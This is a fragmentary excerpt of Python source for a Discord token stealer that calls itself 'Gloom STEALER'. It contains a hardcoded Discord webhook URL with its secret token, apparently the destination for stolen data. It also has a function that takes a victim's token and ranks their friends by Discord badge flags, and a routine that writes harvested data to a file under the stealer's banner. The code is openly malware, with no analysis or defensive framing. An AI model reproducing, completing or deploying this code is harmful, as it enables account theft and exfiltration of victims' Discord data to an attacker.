...
hook = "https://discord.com/api/webhooks/1209606826732294185/3VgBfWajo7M7w-C2QNHYNgJDNyLJael0sebqBxbQTs6wtKx0JaWPORgzq5k9Qv9vhtEq"
...
def GetUHQFriends(token):
    ...
    badgeList =  [
        ...
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "🎖️ "},

        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "🎖️ "},

        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "🎖️ "},

        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "🎖️ "},

        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "🎖️ "},

        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "🎖️ "},

        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "🎖️ "},

        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "🎖️ "},

        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "🎖️ "},

        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "🎖️ "}
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        ...
        f.write(f"<--Gloom STEALER ON TOP-->\n\n")
